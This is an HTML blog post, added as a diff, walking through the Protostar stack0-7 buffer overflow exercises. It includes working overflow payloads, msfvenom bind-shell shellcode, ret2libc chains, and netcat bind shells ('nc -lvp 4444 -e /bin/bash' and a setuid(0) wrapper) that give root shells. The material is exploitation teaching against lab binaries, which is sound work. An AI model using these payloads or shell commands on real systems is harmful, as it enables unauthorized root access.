@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Protostar stack0-7 write-up</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="Stack0 In Stack0 we need to exploit the following program:
+#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) { printf(&amp;quot;you have changed the &#39;modified&#39; variable\n&amp;quot;); } else { printf(&amp;quot;Try again?\n&amp;quot;); } }  Since modified variable is between saved EBP and buffer any character overflowing buffer will change modified:
+user@protostar:~$ echo `python -c &#39;print(&amp;quot;A&amp;quot;*64)&#39;` | /opt/protostar/bin/stack0 Try again?">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="Protostar stack0-7 write-up">
+    <meta name="twitter:description" content="Stack0 In Stack0 we need to exploit the following program:
+#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) { printf(&amp;quot;you have changed the &#39;modified&#39; variable\n&amp;quot;); } else { printf(&amp;quot;Try again?\n&amp;quot;); } }  Since modified variable is between saved EBP and buffer any character overflowing buffer will change modified:
+user@protostar:~$ echo `python -c &#39;print(&amp;quot;A&amp;quot;*64)&#39;` | /opt/protostar/bin/stack0 Try again?">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Protostar stack0-7 write-up">
+  <meta property="og:description" content="Stack0 In Stack0 we need to exploit the following program:
+#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) { printf(&amp;quot;you have changed the &#39;modified&#39; variable\n&amp;quot;); } else { printf(&amp;quot;Try again?\n&amp;quot;); } }  Since modified variable is between saved EBP and buffer any character overflowing buffer will change modified:
+user@protostar:~$ echo `python -c &#39;print(&amp;quot;A&amp;quot;*64)&#39;` | /opt/protostar/bin/stack0 Try again?">
+  <meta property="og:url" content="http://pwntester.com/blog/2013/12/17/protostar-stack0-7-write-up/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2013/12/17/protostar-stack0-7-write-up/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Protostar stack0-7 write-up</h1>
+      <p class="post-meta">@pwntester · Dec 17, 2013 · 11 min read</p>
+    </header>
+    <article class="post-content">
+
+<h2 id="stack0">Stack0</h2>
+
+<p>In <a href="http://www.exploit-exercises.com/protostar/stack0">Stack0</a> we need to exploit the following program:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+
+  modified = 0;
+  gets(buffer);
+
+  if(modified != 0) {
+    printf(&quot;you have changed the 'modified' variable\n&quot;);
+  } else {
+    printf(&quot;Try again?\n&quot;);
+  }
+}
+</code></pre>
+
+<p>Since <strong>modified</strong> variable is between saved <strong>EBP</strong> and <strong>buffer</strong> any character overflowing <strong>buffer</strong> will change <strong>modified</strong>:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ echo `python -c 'print(&quot;A&quot;*64)'` | /opt/protostar/bin/stack0
+Try again?
+user@protostar:~$ echo `python -c 'print(&quot;A&quot;*65)'` | /opt/protostar/bin/stack0
+you have changed the 'modified' variable
+</code></pre>
+
+<p>##Stack1
+<a href="http://www.exploit-exercises.com/protostar/stack1">Stack1</a> is similar but now we have to set modified to the hexadecimal value: 0x61626364</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+
+  if(argc == 1) {
+    errx(1, &quot;please specify an argument\n&quot;);
+  }
+
+  modified = 0;
+  strcpy(buffer, argv[1]);
+
+  if(modified == 0x61626364) {
+    printf(&quot;you have correctly got the variable to the right value\n&quot;);
+  } else {
+    printf(&quot;Try again, you got 0x%08x\n&quot;, modified);
+  }
+}
+</code></pre>
+
+<p>Solution:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ /opt/protostar/bin/stack1 `python -c 'print(&quot;A&quot;*64 + &quot;\x64\x63\x62\x61&quot;)'`
+you have correctly got the variable to the right value
+</code></pre>
+
+<p>##Stack2
+<a href="http://www.exploit-exercises.com/protostar/stack2">Stack2</a> gives us the following code:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+  char *variable;
+
+  variable = getenv(&quot;GREENIE&quot;);
+
+  if(variable == NULL) {
+    errx(1, &quot;please set the GREENIE environment variable\n&quot;);
+  }
+
+  modified = 0;
+
+  strcpy(buffer, variable);
+
+  if(modified == 0x0d0a0d0a) {
+    printf(&quot;you have correctly modified the variable\n&quot;);
+  } else {
+    printf(&quot;Try again, you got 0x%08x\n&quot;, modified);
+  }
+
+}
+</code></pre>
+
+<p>Solution:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ export GREENIE=`python -c 'print(&quot;A&quot;*64 + &quot;\x0a\x0d\x0a\x0d&quot;)'`
+user@protostar:~$ /opt/protostar/bin/stack2
+you have correctly modified the variable
+</code></pre>
+
+<p>#Stack3</p>
+
+<p><a href="http://www.exploit-exercises.com/protostar/stack3">Stack3</a> gives us the following code:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void win()
+{
+  printf(&quot;code flow successfully changed\n&quot;);
+}
+
+int main(int argc, char **argv)
+{
+  volatile int (*fp)();
+  char buffer[64];
+
+  fp = 0;
+
+  gets(buffer);
+
+  if(fp) {
+    printf(&quot;calling function pointer, jumping to 0x%08x\n&quot;, fp);
+    fp();
+  }
+}
+</code></pre>
+
+<p>This time its different, we need to call the <strong>win()</strong> function, so we need to overwrite <strong>fp</strong> with the <strong>win()</strong> address. We will get the address using gdb and then set up the explot to overwrite <strong>modified</strong> with <strong>win()</strong> address:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ gdb -q /opt/protostar/bin/stack3
+Reading symbols from /opt/protostar/bin/stack3...done.
+(gdb) print win
+$1 = {void (void)} 0x8048424 &lt;win&gt;
+(gdb) quit
+user@protostar:~$ echo `python -c 'print(&quot;A&quot;*64 + &quot;\x24\x84\x04\x08&quot;)'` &gt; stack3
+user@protostar:~$ /opt/protostar/bin/stack3 &lt; stack3
+calling function pointer, jumping to 0x08048424
+code flow successfully changed
+</code></pre>
+
+<p>##Stack4
+<a href="http://www.exploit-exercises.com/protostar/stack4">Stack4</a> gives us the following code to exploit:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void win()
+{
+  printf(&quot;code flow successfully changed\n&quot;);
+}
+
+int main(int argc, char **argv)
+{
+  char buffer[64];
+
+  gets(buffer);
+}
+</code></pre>
+
+<p>We need to overwrite <strong>EIP</strong> with <strong>win()</strong> address which is: <strong>0x80483f4</strong></p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ gdb -q /opt/protostar/bin/stack4
+Reading symbols from /opt/protostar/bin/stack4...done.
+(gdb) print win
+$1 = {void (void)} 0x80483f4 &lt;win&gt;
+</code></pre>
+
+<p>So in theory, we need a payload of 64 bytes and then 4 to overwrite <strong>EBP</strong> and 4 more to overwrite <strong>EIP</strong>, but if we run the following line, no segmentation fault is thrown:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ echo `python -c 'print(&quot;A&quot;*64 + &quot;AAAA&quot; + &quot;BBBB&quot;)'` | /opt/protostar/bin/stack4
+</code></pre>
+
+<p>That is because the compiler will do his crazy stuff and align buffers in unexpected ways so <strong>EIP</strong> can be further than we think, so we will be using metasploit framework to find the right offset:</p>
+
+<pre><code class="language-lang-bash">alvaro@winterfell /u/l/s/m/tools&gt; ./pattern_create.rb 100
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+</code></pre>
+
+<pre><code class="language-lang-bash">user@protostar:~$ echo &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&quot; &gt; stack4
+user@protostar:~$
+user@protostar:~$
+user@protostar:~$ gdb -q /opt/protostar/bin/stack4Reading symbols from /opt/protostar/bin/stack4...done.
+(gdb) run &lt; stack4
+Starting program: /opt/protostar/bin/stack4 &lt; stack4
+
+Program received signal SIGSEGV, Segmentation fault.
+0x63413563 in ?? ()
+</code></pre>
+
+<p>Offset is <strong>0x63413563</strong> that corresponds to:</p>
+
+<pre><code class="language-lang-bash">alvaro@winterfell /u/l/s/m/tools&gt; ./pattern_offset.rb 0x63415663
+76
+</code></pre>
+
+<p>So our payload should be shifted 76 bytes from the start of the <strong>buffer</strong>.</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ echo `python -c 'print(&quot;A&quot;*76 + &quot;\xf4\x83\x04\x08&quot;)'` | /opt/protostar/bin/stack4
+code flow successfully changed
+Segmentation fault
+</code></pre>
+
+<p>##Stack5
+<a href="http://www.exploit-exercises.com/protostar/stack5">Stack5</a> gives us the following code to exploit:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char **argv)
+{
+  char buffer[64];
+
+  gets(buffer);
+}
+</code></pre>
+
+<p>So its basically the same program than stack4 but this time they ask us to use a shellcode. Im not a shellcode writer so I will be using msf to generate a valid shellcode for this architecture:</p>
+
+<pre><code class="language-lang-bash">alvaro@winterfell /u/l/s/metasploit-framework&gt; ./msfvenom -p linux/x86/shell_bind_tcp -b '\x0d\x0a\x00\xff' -f pl
+[*] x86/shikata_ga_nai succeeded with size 105 (iteration=1)
+my $buf =
+&quot;\xbd\x9b\x77\x1c\xf3\xdd\xc0\xd9\x74\x24\xf4\x5b\x29\xc9&quot; .
+&quot;\xb1\x14\x31\x6b\x14\x83\xeb\xfc\x03\x6b\x10\x79\x82\x2d&quot; .
+&quot;\x28\x8a\x8e\x1d\x8d\x27\x3b\xa0\x98\x26\x0b\xc2\x57\x28&quot; .
+&quot;\x37\x55\x3a\x40\xca\x69\xab\xcc\xa0\x79\x9a\xbc\xbd\x9b&quot; .
+&quot;\x76\x5a\xe6\x96\x07\x2b\x57\x2d\xbb\x2f\xe8\x4b\x76\xaf&quot; .
+&quot;\x4b\x24\xee\x62\xcb\xd7\xb6\x16\xf3\x8f\x85\x66\x42\x49&quot; .
+&quot;\xee\x0e\x7a\x86\x7d\xa6\xec\xf7\xe3\x5f\x83\x8e\x07\xcf&quot; .
+&quot;\x08\x18\x26\x5f\xa5\xd7\x29&quot;;
+</code></pre>
+
+<p>We will be using a large payload that is bigger than our buffer so we have toplace it in a different location like a environment variable. We can also check how many bytes we can overwrite after passing <strong>EIP</strong></p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ echo `python -c 'print(&quot;A&quot;*76 + &quot;B&quot;*4 + &quot;C&quot;*120)'` &gt; stack5
+user@protostar:~$ gdb -q /opt/protostar/bin/stack5Reading symbols from /opt/protostar/bin/stack5...done.
+(gdb) run &lt; stack5
+Starting program: /opt/protostar/bin/stack5 &lt; stack5
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) x/10s $esp
+0xbffff7c0:	 'C' &lt;repeats 120 times&gt;
+0xbffff839:	 &quot;&quot;
+0xbffff83a:	 &quot;&quot;
+0xbffff83b:	 &quot;&quot;
+0xbffff83c:	 &quot;1\203\004\b\304\203\004\b\001&quot;
+0xbffff846:	 &quot;&quot;
+0xbffff847:	 &quot;&quot;
+0xbffff848:	 &quot;d\370\377\277\360\203\004\b\340\203\004\b@\020\377\267\\\370\377\277\370\370\377\267\001&quot;
+0xbffff862:	 &quot;&quot;
+0xbffff863:	 &quot;&quot;
+(gdb)
+</code></pre>
+
+<p>Nice! Our 120 &ldquo;C&rdquo;s are there (we put some more of the 105 bytes required to allocate a NOP sled)</p>
+
+<p>Ok, so lets craft the payload:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ echo `python -c 'print(&quot;A&quot;*76 + &quot;\xc0\xf7\xff\xbf&quot; + &quot;\x90&quot;*16 + &quot;\xbd\x9b\x77\x1c\xf3\xdd\xc0\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x14\x31\x6b\x14\x83\xeb\xfc\x03\x6b\x10\x79\x82\x2d\x28\x8a\x8e\x1d\x8d\x27\x3b\xa0\x98\x26\x0b\xc2\x57\x28\x37\x55\x3a\x40\xca\x69\xab\xcc\xa0\x79\x9a\xbc\xbd\x9b\x76\x5a\xe6\x96\x07\x2b\x57\x2d\xbb\x2f\xe8\x4b\x76\xaf\x4b\x24\xee\x62\xcb\xd7\xb6\x16\xf3\x8f\x85\x66\x42\x49\xee\x0e\x7a\x86\x7d\xa6\xec\xf7\xe3\x5f\x83\x8e\x07\xcf\x08\x18\x26\x5f\xa5\xd7\x29&quot;)'` | /opt/protostar/bin/stack5
+</code></pre>
+
+<p>Now from a different terminal:</p>
+
+<pre><code class="language-lang-bash">$ nc localhost 4444
+id
+uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
+</code></pre>
+
+<p>##Stack6
+<a href="http://www.exploit-exercises.com/protostar/stack6">Stack6</a> gives us the following code to exploit:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void getpath()
+{
+  char buffer[64];
+  unsigned int ret;
+
+  printf(&quot;input path please: &quot;); fflush(stdout);
+
+  gets(buffer);
+
+  ret = __builtin_return_address(0);
+
+  if((ret &amp; 0xbf000000) == 0xbf000000) {
+    printf(&quot;bzzzt (%p)\n&quot;, ret);
+    _exit(1);
+  }
+
+  printf(&quot;got path %s\n&quot;, buffer);
+}
+
+int main(int argc, char **argv)
+{
+  getpath();
+}
+</code></pre>
+
+<p>The program is similar to <strong>stack5</strong> but in this case we are not allowed to jump to stack addresses (0xbf000000) so we cannot place our payload there. Chances are:
+- Place it on an enviroment variable
+- ret2libc
+- ROP
+- jmp esp
+- &hellip;</p>
+
+<p>First approach is to place the payload in an environment varaible, we will need to know the address of our varaible to jump there. We can use this program for that:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+int main(int argc, char *argv[]) {
+	char *ptr;
+	if(argc &lt; 3) {
+		printf(&quot;Usage: %s &lt;environment variable&gt; &lt;target program name&gt;\n&quot;, argv[0]);
+		exit(0);
+	}
+	ptr = getenv(argv[1]); /* get env var location */
+	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
+	printf(&quot;%s will be at %p\n&quot;, argv[1], ptr);
+}
+</code></pre>
+
+<p>We will be using the same shellcode than in stack5:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ export SHELLCODE=\xbd\x9b\x77\x1c\xf3\xdd\xc0\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x14\x31\x6b\x14\x83\xeb\xfc\x03\x6b\x10\x79\x82\x2d\x28\x8a\x8e\x1d\x8d\x27\x3b\xa0\x98\x26\x0b\xc2\x57\x28\x37\x55\x3a\x40\xca\x69\xab\xcc\xa0\x79\x9a\xbc\xbd\x9b\x76\x5a\xe6\x96\x07\x2b\x57\x2d\xbb\x2f\xe8\x4b\x76\xaf\x4b\x24\xee\x62\xcb\xd7\xb6\x16\xf3\x8f\x85\x66\x42\x49\xee\x0e\x7a\x86\x7d\xa6\xec\xf7\xe3\x5f\x83\x8e\x07\xcf\x08\x18\x26\x5f\xa5\xd7\x29
+user@protostar:~$ gcc envaddr.c -o envaddr
+user@protostar:~$ chmod +x envaddr
+user@protostar:~$ ./envaddr SHELLCODE
+SHELLCODE is at address 0xbffff877
+</code></pre>
+
+<p>Oh, damn it! its in the stack address space so it wont work. Lets try the retlibc approach. Here we have a number of options. We can execute <strong>system(&ldquo;/bin/bash&rdquo;)</strong> but as we are exploiting a suid binary, we will drop priviledges. The other options is to use <strong>execl(“/bin/bash”, “/bin/bash”, 0)</strong>. The problem with this approach is that we cannot inject the <strong>&ldquo;0&rdquo;</strong> since <strong>gets()</strong> would consider it as the end of the user input. There is a technique to avoid this. We can use <strong>printf</strong> to write the <strong>\x00</strong> for us in the right position using <strong>%n</strong></p>
+
+<p>If you are not familiar with <strong>ret2libc</strong> this is how it works. You overwrite the return address with a libc function so it gets executed. At the end of the libc function, there will be a <strong>ret</strong> instruction that will pop the next 4 bytes in the stack and transfer the exceution to the address popped. Its important to note that when the <strong>libc</strong> function starts its execution it will expect its arguments in the regular position, thats it, after the ret address. So we have to prepare the stack like:</p>
+
+<pre><code class="language-lang-bash">--------------------------------------------------------------------------------------------------------------------
+| buffer | overwritten EBP | libc function address | return address for libc function | arguments to libc function |
+--------------------------------------------------------------------------------------------------------------------
+</code></pre>
+
+<p>We can concatenate different calls by replacing the &ldquo;return address for libc function&rdquo; with a second function address. In that case the arguments for that second function should be 4 bytes above the address of the second function.</p>
+
+<p>Ok, enough theory, we will be using two concatenated calls. The first one will be <strong>prinntf</strong> and we will use it to write a <strong>0</strong> in the stack, the one we need for our second call to <strong>execl(“/bin/bash”, “/bin/bash”, 0)</strong></p>
+
+<p>So, the payload should look like this:</p>
+
+<pre><code class="language-lang-bash">----------------------------------------------------------------------
+| buffer | BBBB | &amp;printf | &amp;execl | &amp;&quot;%3$n&quot; | &amp;&quot;nc&quot; | &amp;&quot;nc&quot; | CCCC |
+----------------------------------------------------------------------
+</code></pre>
+
+<p>Where BBBB and CCCC will be random values. BBBB will overwrite EBP and CCCC will be overwritten by the <strong>printf(&ldquo;%3$n&rdquo;)</strong></p>
+
+<p>We need to place to strings in memory. we can use our buffer for that or simply put them in environment variables:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ export PRINTF=&quot;%3\$n&quot;
+user@protostar:~$ export NC=&quot;bind.sh&quot;
+user@protostar:~$ ./envaddr NC /opt/protostar/bin/stack6
+NC will be at 0xbffff9cf
+user@protostar:~$ ./envaddr PRINTF /opt/protostar/bin/stack6
+PRINTF will be at 0xbffff983
+</code></pre>
+
+<p>I will be executing a nc daemon sending a shell and listening on port 4444:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ cat bind.sh
+nc -lvp 4444 -e /bin/bash
+user@protostar:~$ chmod +x bind.sh
+user@protostar:~$ export PATH=/home/user:$PATH
+</code></pre>
+
+<pre><code class="language-lang-bash">user@protostar:~$ gdb -q /opt/protostar/bin/stack6
+Reading symbols from /opt/protostar/bin/stack6...done.
+(gdb) b main
+Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
+(gdb) run
+Starting program: /opt/protostar/bin/stack6
+
+Breakpoint 1, main (argc=1, argv=0xbffff6f4) at stack6/stack6.c:27
+
+(gdb) print execl
+$1 = {&lt;text variable, no debug info&gt;} 0xb7f2e460 &lt;*__GI_execl&gt;
+(gdb) print printf
+$2 = {&lt;text variable, no debug info&gt;} 0xb7eddf90 &lt;__printf&gt;
+</code></pre>
+
+<p>Ok, now we have all we need:</p>
+
+<p>buffer: &ldquo;A&rdquo;*76
+EBP: &ldquo;BBBB&rdquo;
+&amp;printf: \x90\xdf\xed\xb7
+&amp;execl: \x60\xe4\xf2\xb7
+&amp;&ldquo;%3$n&rdquo;: \x60\xf8\xff\xbf
+&amp;&ldquo;nc&rdquo;: \xe4\xf9\xff\xbf</p>
+
+<p>Unfortunately the exploit did not work and after adjunting the buffer address and env variables with detail, it still throws a segmentation fault during the execution of the <strong>execl</strong> system function. After debugging it with <strong>gdb</strong> it looks like all the variables are set ok on our buffer and all of them point to the right functions/strings. Stepping through the code we can see that the <strong>printf</strong> trick works and we are moved into the <strong>execl</strong> with the right parameters. However we get a <strong>segmentation fault</strong> that I cannot explain so I decided to take a different road to get a more stable exploit. This is the last payload I tried:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ echo `python -c 'print(&quot;A&quot;*76 + &quot;B&quot;*4 + &quot;\x90\xdf\xed\xb7&quot; + &quot;\x60\xe4\xf2\xb7&quot; + &quot;\x8f\xff\xff\xbf&quot; + &quot;\x75\xff\xff\xbf&quot; + &quot;\x75\xff\xff\xbf&quot; + &quot;\x90\xf7\xff\xbf&quot;)'` &gt; stack6
+</code></pre>
+
+<p>Ok, so whats the new road??? I will simple call <strong>system()</strong> to execute a binary that will restore the setuid priviledges. Our payload should look like this:</p>
+
+<pre><code class="language-lang-bash">-------------------------------------------------------------
+| buffer | BBBB | &amp;system | &amp;exit | &amp;&quot;/home/user/bindshell&quot; |
+-------------------------------------------------------------
+</code></pre>
+
+<p>We will use the following priviledges restore netcat daemon:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+
+int main(int argc, char **argv, char **envp) {
+	// These two are necessary, as system() drops privileges
+    setuid(0);
+    setgid(0);
+    char *args[] = {  &quot;nc&quot;, &quot;-nvlp 4444&quot;, &quot;-e/bin/sh&quot;, (char *) 0 };
+    execve(&quot;/bin/nc&quot;, args, envp);
+}
+</code></pre>
+
+<p>Ok, now lets go for <strong>system()</strong> and <strong>exit()</strong> addresses:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ gdb -q /opt/protostar/bin/stack6
+Reading symbols from /opt/protostar/bin/stack6...done.
+(gdb) b main
+Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
+(gdb) run
+Starting program: /opt/protostar/bin/stack6
+
+Breakpoint 1, main (argc=1, argv=0xbffff804) at stack6/stack6.c:27
+(gdb) p system
+$1 = {&lt;text variable, no debug info&gt;} 0xb7ecffb0 &lt;__libc_system&gt;
+(gdb) p exit
+$2 = {&lt;text variable, no debug info&gt;} 0xb7ec60c0 &lt;*__GI_exit&gt;
+</code></pre>
+
+<p>and lastly for our string address:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ export BINDSHELL=/////////////////////////////////////home/user/bindshell
+user@protostar:~$ ./envaddr BINDSHELL /opt/protostar/bin/stack6
+BINDSHELL will be at 0xbffff962
+</code></pre>
+
+<p>Now, the exploit should look like:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ echo `python -c 'print(&quot;A&quot;*76 + &quot;B&quot;*4 + &quot;\xb0\xff\xec\xb7&quot; + &quot;\xc0\x60\xec\xb7&quot; + &quot;\x62\xf9\xff\xbf&quot;)'` | /opt/protostar/bin/stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAABBBB����`�b���
+listening on [any] 4444 ...
+</code></pre>
+
+<p>Now from a different terminal:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ nc localhost 4444
+id
+uid=0(root) gid=0(root) groups=0(root),1001(user)
+</code></pre>
+
+<p>##Stack7
+<a href="http://www.exploit-exercises.com/protostar/stack7">Stack7</a> gives us the following code to exploit:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+char *getpath()
+{
+  char buffer[64];
+  unsigned int ret;
+
+  printf(&quot;input path please: &quot;); fflush(stdout);
+
+  gets(buffer);
+
+  ret = __builtin_return_address(0);
+
+  if((ret &amp; 0xb0000000) == 0xb0000000) {
+    printf(&quot;bzzzt (%p)\n&quot;, ret);
+    _exit(1);
+  }
+
+  printf(&quot;got path %s\n&quot;, buffer);
+  return strdup(buffer);
+}
+
+int main(int argc, char **argv)
+{
+  getpath();
+}
+</code></pre>
+
